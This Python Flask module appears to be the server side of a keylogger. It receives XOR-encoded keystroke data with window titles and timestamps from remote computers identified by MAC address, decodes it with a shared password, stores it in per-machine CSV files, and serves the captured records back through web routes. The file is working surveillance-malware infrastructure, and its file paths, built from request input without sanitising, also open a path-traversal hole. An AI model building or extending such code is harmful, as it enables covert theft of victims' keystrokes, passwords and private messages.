from flask import send_from_directory , request,jsonify
import sys
import os
from dotenv import load_dotenv
import csv
import pandas as pd

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FOLDER = os.path.join(BASE_DIR, "computers")

# Loading environment variables
load_dotenv()
password = os.environ.get('PASSWORD')
file_name = os.environ.get('FILENAME')


# Decryption function
def _decrypt(encrypted_text: list) -> str:
    """
    Receives an encrypted value and
    returns it unencrypted according
    to the password we set in advance
    """
    return ''.join(
            chr(x ^ ord(y))
            for x, y in zip(
                encrypted_text,
                password * (len(encrypted_text) // len(password))
                + password[: len(encrypted_text) % len(password)]
            )
        )

# A function to load the data from the database


# Function to return the main HTML page
def index_page():
    """
    Returns the main html page
    """
    return send_from_directory("../front", "index.html")


# A function to get all the computers
def get_users():
    """
    Returns all MAC addresses of
     the active computers
    """
    directory = './computers'
    all_items = os.listdir(directory)
    files = [str(f)[9:-4].replace('-',':') for f in all_items if os.path.isfile(os.path.join(directory, f))]
    return jsonify(files)

# A function to get information for a specific computer
def get_data_by_mac(mac_address):
    """
    Returns all data for a
     specific computer
    """
    corrct_mac_address = str(mac_address).replace(":", "-")
    csv_file_path = f'./computers/computer_{corrct_mac_address}.csv'
    try:
        df = pd.read_csv(csv_file_path)
        data_as_dict = df.to_dict(orient='records')
        return jsonify(data_as_dict)
    except FileNotFoundError:
        return jsonify({'error': 'computer not found '})


# Function to store data
def store_data():
    """
    Saves all the data received from
    the computers in a database file
    """
    data = request.get_json()
    for mac in data:
        sanitized_mac = mac.replace(":", "-")
        csv_file_path = os.path.join(LOG_FOLDER, f"computer_{sanitized_mac}.csv")
        file_exists = os.path.isfile(csv_file_path)
        with open(csv_file_path, 'a', newline='', encoding='utf-8') as csvfile:
            writer = csv.writer(csvfile)
            if not file_exists:
                writer.writerow(['MAC_address','window_mame','timestamp','data'])
            flattened_data = [
                [mac, window, timestamp, _decrypt(data_keys)]
                for window, timestamps in data[mac].items()
                for timestamp, data_keys in timestamps.items()
            ]
            writer.writerows(flattened_data)

    return jsonify({"message": "Data stored successfully"})



def handle_url_params():
    param = request.args.get("param", "default_value")
    return {"param_received": param}
